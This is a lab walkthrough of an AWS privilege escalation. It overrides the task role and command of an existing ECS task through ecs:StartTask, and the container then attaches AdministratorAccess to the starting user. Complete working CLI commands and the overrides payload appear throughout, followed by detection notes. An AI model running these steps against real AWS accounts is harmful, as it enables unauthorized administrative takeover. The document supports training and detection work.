# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:StartTask (No RegisterTaskDefinition or RegisterContainerInstance Required)

This scenario demonstrates a privilege escalation vulnerability where a user with only `iam:PassRole` and `ecs:StartTask` permissions can escalate to administrator access **without needing `ecs:RegisterTaskDefinition` or `ecs:RegisterContainerInstance`**. The attacker exploits the `--overrides` parameter of the `ecs:StartTask` API to hijack an existing task definition, overriding both the container command and the task role.

Unlike ECS-007 (which requires `ecs:RegisterContainerInstance` to register an EC2 into the cluster), this scenario assumes a container instance is **already registered** in the ECS cluster. Unlike ECS-008 (which uses Fargate via `ecs:RunTask`), this scenario uses the EC2 launch type via `ecs:StartTask`, which requires specifying a `--container-instances` parameter.

This attack path builds on [research by Tom McLean at Reverse Security](https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path), which identified that the `ecs:StartTask` API accepts a `taskRoleArn` override that allows the caller to substitute a privileged role at runtime. Combined with a command override, the attacker can launch an existing benign task definition with completely different behavior and elevated permissions. Because no new task definition is created, traditional detection strategies that focus on `RegisterTaskDefinition` events will miss this attack entirely.

## The Challenge

You start as `pl-prod-ecs-009-to-admin-starting-user`, an IAM user with a minimal but dangerous permission set: `iam:PassRole` on the ECS admin task role and execution role, plus `ecs:StartTask` on `*`. Your goal is to gain `AdministratorAccess` — a managed policy attached to your own user, which you can verify by successfully calling `aws iam list-users`.

The environment contains a pre-existing ECS cluster (`pl-prod-ecs-009-cluster`) with a registered EC2 container instance and an existing benign task definition (`pl-prod-ecs-009-existing-task`). There is also a privileged IAM role (`pl-prod-ecs-009-to-admin-target-role`) with `AdministratorAccess` that trusts `ecs-tasks.amazonaws.com`.

You do not need to register a new task definition or container instance. Everything you need is already in place.

## Reconnaissance

First, establish your identity and confirm you cannot perform admin actions yet.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-ecs-009-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- as expected
```

Now discover the ECS resources in the account. List available clusters to find the target cluster:

```bash
aws ecs list-clusters
# "arn:aws:ecs:{region}:{account_id}:cluster/pl-prod-ecs-009-cluster"
```

Find the pre-existing task definition you will exploit:

```bash
aws ecs list-task-definitions --family-prefix pl-prod-ecs-009-existing-task
# "arn:aws:ecs:{region}:{account_id}:task-definition/pl-prod-ecs-009-existing-task:1"
```

The key insight here is that you do *not* need `ecs:RegisterTaskDefinition`. This task definition is already registered and waiting to be started. You only need to override its behavior at runtime.

Retrieve the container instance ARN from the cluster — `ecs:StartTask` requires you to specify a `--container-instances` target, unlike `ecs:RunTask` which handles placement automatically:

```bash
aws ecs list-container-instances \
  --cluster pl-prod-ecs-009-cluster \
  --query 'containerInstanceArns[0]' \
  --output text
# arn:aws:ecs:{region}:{account_id}:container-instance/pl-prod-ecs-009-cluster/{instance_id}
```

Save this ARN — you need it for the exploit step.

## Exploitation

Here is where the attack diverges from what most detection tools expect. Instead of creating a new task definition (which would generate a `RegisterTaskDefinition` CloudTrail event and trigger many detection rules), you start the *existing* task definition with an `--overrides` payload that substitutes both the container command and the task role.

Build the overrides JSON and launch the task:

```bash
OVERRIDES='{
  "taskRoleArn": "arn:aws:iam::{account_id}:role/pl-prod-ecs-009-to-admin-target-role",
  "containerOverrides": [
    {
      "name": "pl-prod-ecs-009-benign-container",
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "pl-prod-ecs-009-to-admin-starting-user",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ]
    }
  ]
}'

aws ecs start-task \
  --cluster pl-prod-ecs-009-cluster \
  --task-definition pl-prod-ecs-009-existing-task \
  --container-instances arn:aws:ecs:{region}:{account_id}:container-instance/pl-prod-ecs-009-cluster/{instance_id} \
  --overrides "$OVERRIDES"
```

Two things happen simultaneously in this single API call:

1. `taskRoleArn` overrides the role that the running container receives as its credential source. Instead of the benign role defined in the task definition, the container will have `AdministratorAccess` credentials available via IMDS.
2. The `containerOverrides.command` replaces the container's entrypoint command. The AWS CLI is invoked inside the container using the overridden admin role's credentials to call `iam:AttachUserPolicy` on your starting user.

The `iam:PassRole` permission is what makes the `taskRoleArn` override possible — without it, ECS would reject the request because you would be substituting a role you are not authorized to pass.

Note the task ARN from the response and wait for the task to reach `STOPPED` status:

```bash
aws ecs describe-tasks \
  --cluster pl-prod-ecs-009-cluster \
  --tasks {task_arn} \
  --query 'tasks[0].lastStatus' \
  --output text
```

Once the task is stopped with exit code 0, wait approximately 15 seconds for IAM policy changes to propagate across AWS infrastructure.

## Verification

Check whether `AdministratorAccess` was attached to your starting user:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-ecs-009-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyName' \
  --output text
# AdministratorAccess
```

Now confirm you actually have admin access with the starting user's credentials:

```bash
aws iam list-users --max-items 3
# Successfully returns a list of IAM users
```

You now have full `AdministratorAccess` on the `pl-prod-ecs-009-to-admin-starting-user` IAM user.

## What Happened

You exploited the `ecs:StartTask` API's `--overrides` parameter to completely hijack an existing task definition at runtime. By substituting both the task role (via `taskRoleArn`) and the container command (via `containerOverrides`), you turned a harmless benign task into a privilege escalation vehicle — without ever calling `RegisterTaskDefinition` or `RegisterContainerInstance`.

This technique is particularly dangerous in real environments because most ECS privilege escalation defenses focus on monitoring `RegisterTaskDefinition` events and restricting who can create new task definitions. Those controls are entirely bypassed here. The only CloudTrail signal is a `StartTask` event (with overrides in the request parameters) and a subsequent `AttachUserPolicy` event where the caller is an ECS task role — a combination that many SIEM rules do not correlate by default.

In production environments, this attack path exists whenever a principal has `iam:PassRole` on a role with elevated permissions combined with `ecs:StartTask` and there is at least one registered container instance in an ECS cluster. The pre-existence of a task definition and container instance — conditions that are almost always met in active ECS environments — is all that is required.
